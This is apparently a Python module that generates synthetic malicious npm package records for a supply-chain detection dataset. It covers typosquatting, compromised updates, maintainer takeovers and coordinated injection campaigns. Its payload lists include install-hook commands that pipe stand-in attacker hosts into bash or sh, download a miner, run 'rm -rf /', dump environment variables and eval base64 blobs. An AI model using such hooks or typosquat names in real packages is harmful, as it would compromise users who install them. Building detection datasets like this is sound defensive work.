import json
import string
from neo4j.graph import Node
import random
import copy
from datetime import datetime, timedelta, timezone

def node_to_package(node: Node):
    props = {key: node[key] for key in node.keys()}
    props["element_id"] = node.element_id
    props["labels"] = list(node.labels)

    json_formatted_properties = ["author", "repository", "dist", "scripts", "_npmUser", "dependencies","maintainers"]

    for property in json_formatted_properties:
        prop = props.get(property)
        if prop is not None:
            props[property] = json.loads(prop)

    return props

def populate_database(file_path="top1000packages.txt", fn=lambda: None):
    with open(file_path, 'r') as file:
        for line in file:
            cleaned_line = line.strip()
            fn(cleaned_line)

# Create a random typosquat name
def typosquat_name(name):
    if not name or len(name) < 3:
        return f"{name}-malicious"

    technique = random.choice(['swap', 'double', 'missing', 'suffix', 'prefix'])
    name_characters = list(name)

    if technique == 'swap':
        i = random.randint(0, len(name_characters) - 2)
        name_characters[i], name_characters[i+1] = name_characters[i+1], name_characters[i]
    elif technique == 'double':
        i = random.randint(0, len(name_characters) - 1)
        name_characters.insert(i, name_characters[i])
    elif technique == 'missing':
        i = random.randint(0, len(name_characters) - 1)
        del name_characters[i]
    elif technique == 'suffix':
        return f"{name}-js"
    elif technique == 'prefix':
        return f"node-{name}"

    return "".join(name_characters)

def generate_malicious_package(target_benign_name, name_suffix):
    """Generates a synthetic malicious package."""
    pkg_name = typosquat_name(target_benign_name)
    script_payloads = [
        "curl -s http://evil-server.com/payload | bash",
        "wget http://attacker.cn/miner.exe",
        "node setup_bun.js",
        "eval(Buffer.from('...').toString())",
        "rm -rf /",
        "export BAD_ENV=$(printenv)"
    ]
    script_type = random.choice(["preinstall", "postinstall", "install"])
    return {
        "name": pkg_name,
        "version": "0.0.1",
        "weekly_downloads": random.randint(0, 100),
        "dependency_count": random.randint(0, 1),
        "maintainers": [{"name": "hacker_1", "email": "h@evil.io"}],
        "scripts": {script_type: random.choice(script_payloads)},
        "description": "",
        "dependencies": [],
        "collected_at": create_random_recent_timestamp()
    }

# Timestamp helpers
# Create random recent timestamp (past 180 days)
def create_random_recent_timestamp():
    days_ago = random.uniform(1, 180)
    ts = datetime.now(timezone.utc) - timedelta(days=days_ago)
    return ts.isoformat()

# Create random past datetimes (180 days)
def create_random_recent_datetime() -> datetime:
    days_ago = random.uniform(1, 180)
    return datetime.now(timezone.utc) - timedelta(days=days_ago)

# Used to create timestamp within some n minutes around original datetime (20+- min)
def create_random_grouped_timestamp(campaign_dt: datetime, jitter_minutes: float = 20.0):
    offset = timedelta(minutes=random.uniform(-jitter_minutes, jitter_minutes))
    return (campaign_dt + offset).isoformat()

# Randomness helpers for obfuscation
# Create random byte str
def random_entropy_blob(min_len=80, max_len=200):
    n = random.randint(min_len, max_len)
    alphabet = string.ascii_letters + string.digits + "+/="
    return "".join(random.choice(alphabet) for _ in range(n))

# Create random sus install script (each has at least one sus indicator)
def subtle_script_string():
    templates = [
        "node -e \"require('child_process').exec('node tools/setup.js')\"",
        "node -e \"{}\"".format(random_entropy_blob()),
        "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(random_entropy_blob(60, 120)),
        "curl -s http://cdn-assets-{}.io/setup.sh | sh".format(random.randint(100, 999)),
        "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(random_entropy_blob(80, 150)),
    ]
    return random.choice(templates)

# Add subtle script hook
def add_subtle_script(pkg):
    if "scripts" not in pkg or not isinstance(pkg["scripts"], dict):
        pkg["scripts"] = {}
    hook = random.choice(["preinstall", "install", "postinstall"])
    if hook in pkg["scripts"]:
        pkg["scripts"][hook] = str(pkg["scripts"][hook]) + " && " + subtle_script_string()
    else:
        pkg["scripts"][hook] = subtle_script_string()

# Bump patch version
def bump_patch_version(version: str):
    try:
        parts = version.split(".")
        if len(parts) != 3:
            return version
        parts[2] = str(int(parts[2]) + 1)
        return ".".join(parts)
    except Exception:
        return version

# Benign scripts and descriptions to help normalize the benign datasets
SCRIPTS = [
    {"test": "jest --coverage", "lint": "eslint src/", "build": "tsc"},
    {"test": "mocha test/", "build": "webpack --mode production"},
    {"test": "tap test/*.js", "prepublishOnly": "npm run build"},
    {"test": "jest", "prepare": "npm run build", "lint": "eslint ."},
    {"test": "jasmine", "lint": "tslint -c tslint.json src/**/*.ts"},
    {"test": "ava", "build": "rollup -c rollup.config.js"},
    {"test": "node test/index.js", "preversion": "npm test"},
    {},
    {},
    {},
]

DESCRIPTIONS = [
    "Utility library for common JavaScript operations",
    "Async flow control library for Node.js",
    "Lightweight HTTP client with Promise support",
    "Fast data serialization and parsing utilities",
    "TypeScript definitions and runtime helpers",
    "Minimal logging framework for Node applications",
    "Schema validation and coercion library",
    "Zero-dependency string manipulation utilities",
    "Cross-platform file system helpers",
    "Event emitter polyfill and extension library",
]

# Used to add realistic data to a very minimal benign package (to normalize packages)
def enrich_benign_package(pkg):
    pkg = copy.deepcopy(pkg)
    name = pkg.get("name", "pkg")

    if not pkg.get("scripts"):
        pkg["scripts"] = random.choice(SCRIPTS)

    if not pkg.get("description"):
        pkg["description"] = random.choice(DESCRIPTIONS)

    if not pkg.get("maintainers"):
        handle = name.replace("-", "").replace("@", "").replace("/", "")[:12] or "maintainer"
        pkg["maintainers"] = [{"name": handle, "email": f"{handle}@example.com"}]

    if not pkg.get("repository"):
        pkg["repository"] = {"type": "git", "url": f"git://github.com/org/{name}.git"}

    if not pkg.get("dist"):
        file_count = random.randint(5, 40)
        pkg["dist"] = {
            "fileCount": file_count,
            "unpackedSize": file_count * random.randint(800, 4000),
        }

    if not pkg.get("author"):
        pkg["author"] = {"name": "Maintainer", "email": "m@example.com"}

    # Benign packages have uncorrelated, spread-out timestamps
    if not pkg.get("collected_at"):
        pkg["collected_at"] = create_random_recent_timestamp()

    return pkg

# Normalize benign dataset (NOT CURRENTLY IN USE), 
# doing it for testing accuracy optimizations
def enrich_benign_dataset(packages):
    result = {}
    for k, v in packages.items():
        pkg = enrich_benign_package(v)
        name = pkg.get("name") or k.split("@")[0]
        version = pkg.get("version") or "0.0.0"
        result[f"{name}@{version}"] = pkg
    return result

# Individual malicious generators
# Bump version and create compromised update
def generate_compromised_update(benign_pkg, campaign_dt = None):
    pkg = copy.deepcopy(benign_pkg)
    pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
    wd = float(pkg.get("weekly_downloads", 0))
    pkg["weekly_downloads"] = max(0, int(wd * random.uniform(0.9, 1.1)))
    add_subtle_script(pkg)

    if random.random() < 0.35:
        deps = pkg.get("dependencies", [])
        if not isinstance(deps, list):
            deps = []
        if deps:
            deps = deps + [random.choice(deps)]
        pkg["dependencies"] = deps

    pkg["dependency_count"] = len(pkg.get("dependencies", []))
    pkg["collected_at"] = (create_random_grouped_timestamp(campaign_dt) if campaign_dt else create_random_recent_timestamp())
    return pkg

# New maintainer added and remove existing maintainers
def generate_maintainer_takeover(benign_pkg, campaign_dt = None):
    pkg = copy.deepcopy(benign_pkg)
    pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))

    maintainers = pkg.get("maintainers", [])
    if not isinstance(maintainers, list):
        maintainers = []
    maintainers = maintainers[:]

    new_m = {"name": "maintainer_new", "email": "new@unknown-domain.xyz"}
    if len(maintainers) == 0:
        maintainers = [new_m]
    else:
        maintainers.append(new_m)

    pkg["maintainers"] = maintainers
    add_subtle_script(pkg)
    pkg["dependency_count"] = len(pkg.get("dependencies", []))
    pkg["collected_at"] = (create_random_grouped_timestamp(campaign_dt) if campaign_dt else create_random_recent_timestamp())
    return pkg

def generate_realistic_typosquat(target_name, target_pkg, benign_names):
    pkg_name = typosquat_name(target_name)

    base = {
        "name": pkg_name,
        "version": "1.0.0",
        "description": (target_pkg.get("description") or "Utility helpers").strip()[:80],
        "weekly_downloads": int(max(0, random.gauss(200, 120))),
        "dependencies": [],
        "scripts": {},
        "maintainers": [{"name": "maintainer_new", "email": "new@unknown-domain.xyz"}],
        "collected_at": create_random_recent_timestamp()
    }

    k = random.randint(1, 5)
    base["dependencies"] = random.sample(benign_names, k=min(k, len(benign_names)))
    base["dependency_count"] = len(base["dependencies"])
    add_subtle_script(base)
    return base

# Attack Simulations
# Each simulation pins all affected packages to the same campaign_dt
def simulate_coordinated_maintainer_compromise(packages, num_targets = 5, attacker_name = "attacker_account", campaign_dt = None):
    benign_names = list(packages.keys())
    if not benign_names:
        return {}

    if campaign_dt is None:
        campaign_dt = create_random_recent_datetime()

    targets = random.sample(benign_names, k=min(num_targets, len(benign_names)))

    campaign_script = "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(
        random_entropy_blob(100, 200)
    )
    campaign_hook = random.choice(["preinstall", "postinstall"])

    result = {}
    for node_key in targets:
        pkg = copy.deepcopy(packages[node_key])
        bare_name = pkg.get("name") or node_key.split("@")[0]
        pkg["name"] = bare_name
        pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))

        maintainers = pkg.get("maintainers", [])
        if not isinstance(maintainers, list):
            maintainers = []
        attacker_entry = {"name": attacker_name, "email": f"{attacker_name}@unknown-domain.xyz"}
        pkg["maintainers"] = maintainers[:] + [attacker_entry]

        if not isinstance(pkg.get("scripts"), dict):
            pkg["scripts"] = {}
        pkg["scripts"][campaign_hook] = campaign_script
        pkg["dependency_count"] = len(pkg.get("dependencies", []))
        pkg["collected_at"] = create_random_grouped_timestamp(campaign_dt, jitter_minutes=20)
        result[f"{bare_name}@{pkg['version']}"] = pkg

    return result

# Simulated coordinated dependency injection
def simulate_coordinated_dependency_injection(packages, num_targets = 5, malicious_dep_name = None, campaign_dt = None):
    benign_names = list(packages.keys())
    if not benign_names:
        return {}

    if malicious_dep_name is None:
        malicious_dep_name = typosquat_name(random.choice(benign_names))

    if campaign_dt is None:
        campaign_dt = create_random_recent_datetime()

    targets = random.sample(benign_names, k=min(num_targets, len(benign_names)))

    result = {}
    for node_key in targets:
        pkg = copy.deepcopy(packages[node_key])
        bare_name = pkg.get("name") or node_key.split("@")[0]
        pkg["name"] = bare_name
        pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
        deps = pkg.get("dependencies", [])
        if not isinstance(deps, list):
            deps = []
        if malicious_dep_name not in deps:
            deps = deps + [malicious_dep_name]
        pkg["dependencies"] = deps
        pkg["dependency_count"] = len(deps)
        pkg["collected_at"] = create_random_grouped_timestamp(campaign_dt, jitter_minutes=20)
        result[f"{bare_name}@{pkg['version']}"] = pkg

    # The injected dep itself. new node, campaign timestamp, suspicious features
    result[f"{malicious_dep_name}@0.0.1"] = {
        "name": malicious_dep_name,
        "version": "0.0.1",
        "weekly_downloads": random.randint(0, 50),
        "dependency_count": 0,
        "dependencies": [],
        "maintainers": [{"name": "attacker_account", "email": "attacker@unknown-domain.xyz"}],
        "scripts": {
            "postinstall": "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(
                random_entropy_blob(100, 200)
            )
        },
        "description": "",
        "is_deprecated": False,
        "repository": {},
        "collected_at": create_random_grouped_timestamp(campaign_dt, jitter_minutes=5),
    }

    return result

# Simulated coordinated script injection
def simulate_coordinated_script_injection(
    packages,
    num_targets: int = 5,
    campaign_dt: datetime = None,
):
    benign_names = list(packages.keys())
    if not benign_names:
        return {}

    if campaign_dt is None:
        campaign_dt = create_random_recent_datetime()

    targets = random.sample(benign_names, k=min(num_targets, len(benign_names)))

    shared_payload = "node -e \"eval(Buffer.from('{}','base64').toString())\"".format(
        random_entropy_blob(120, 200)
    )
    campaign_hook = "postinstall"

    result = {}
    for node_key in targets:
        pkg = copy.deepcopy(packages[node_key])
        bare_name = pkg.get("name") or node_key.split("@")[0]
        pkg["name"] = bare_name
        pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))
        if not isinstance(pkg.get("scripts"), dict):
            pkg["scripts"] = {}
        pkg["scripts"][campaign_hook] = shared_payload
        pkg["dependency_count"] = len(pkg.get("dependencies", []))
        pkg["collected_at"] = create_random_grouped_timestamp(campaign_dt, jitter_minutes=20)
        result[f"{bare_name}@{pkg['version']}"] = pkg
    return result

# Create Datasets
def create_dataset(benign_json_data, num_malicious, mix=None):
    # Creates a synthetic malicious dataset by applying a weighted mix of attack
    #scenarios to the given benign packages.
    if mix is None:
        mix = {
            "compromised_update":     0.15,
            "maintainer_takeover":    0.08,
            "typosquat":              0.07,
            "coordinated_maintainer": 0.25,
            "coordinated_dep_inject": 0.25,
            "coordinated_script":     0.20,
        }

    benign_keys = list(benign_json_data.keys())
    if not benign_keys:
        return {}

    # Bare names for use in typosquat deps and name-based operations.
    # Works whether keys are name-only or versioned
    bare_names = [
        (benign_json_data[k].get("name") or k.split("@")[0])
        for k in benign_keys
    ]

    scenarios = []
    for k, w in mix.items():
        scenarios += [k] * int(w * 100)

    out = {}
    added = 0
    max_iterations = num_malicious * 6

    # Randomly add different attack scenarios
    for _ in range(max_iterations):
        if added >= num_malicious:
            break

        scenario = random.choice(scenarios)
        target_key = random.choice(benign_keys)
        target_pkg = benign_json_data[target_key]
        bare_target = target_pkg.get("name") or target_key.split("@")[0]

        if scenario == "compromised_update":
            m_pkg = generate_compromised_update(target_pkg)
            m_pkg["name"] = bare_target
            m_key = f"{m_pkg['name']}@{m_pkg['version']}"
            if m_key not in out:
                out[m_key] = m_pkg
                added += 1

        elif scenario == "maintainer_takeover":
            m_pkg = generate_maintainer_takeover(target_pkg)
            m_pkg["name"] = bare_target
            m_key = f"{m_pkg['name']}@{m_pkg['version']}"
            if m_key not in out:
                out[m_key] = m_pkg
                added += 1

        elif scenario == "typosquat":
            m_pkg = generate_realistic_typosquat(bare_target, target_pkg, bare_names)
            m_key = f"{m_pkg['name']}@{m_pkg['version']}"
            if m_key not in out:
                out[m_key] = m_pkg
                added += 1

        elif scenario == "coordinated_maintainer":
            # Same maintainer added to multiple packages at same time
            campaign_dt = create_random_recent_datetime()
            batch_size = random.randint(3, 6)
            attacker = f"attacker_{random.randint(1000, 9999)}"
            batch = simulate_coordinated_maintainer_compromise(
                benign_json_data,
                num_targets=min(batch_size, len(benign_keys)),
                attacker_name=attacker,
                campaign_dt=campaign_dt,
            )
            for pkg_key, pkg in batch.items():
                if pkg_key not in out and added < num_malicious:
                    out[pkg_key] = pkg
                    added += 1

        # Essentially like a bunch of dependencies were added to multiple different packages at around the same time
        elif scenario == "coordinated_dep_inject":
            campaign_dt = create_random_recent_datetime()
            batch_size = random.randint(3, 6)
            dep_name = typosquat_name(random.choice(bare_names))
            batch = simulate_coordinated_dependency_injection(
                benign_json_data,
                num_targets=min(batch_size, len(benign_keys)),
                malicious_dep_name=dep_name,
                campaign_dt=campaign_dt,
            )
            for pkg_key, pkg in batch.items():
                if pkg_key not in out and added < num_malicious:
                    out[pkg_key] = pkg
                    added += 1

        # Bunch of scripts (that are the same) added to multiple different packages at same time
        elif scenario == "coordinated_script":
            campaign_dt = create_random_recent_datetime()
            batch_size = random.randint(3, 6)
            batch = simulate_coordinated_script_injection(
                benign_json_data,
                num_targets=min(batch_size, len(benign_keys)),
                campaign_dt=campaign_dt,
            )
            for pkg_key, pkg in batch.items():
                if pkg_key not in out and added < num_malicious:
                    out[pkg_key] = pkg
                    added += 1

    return out
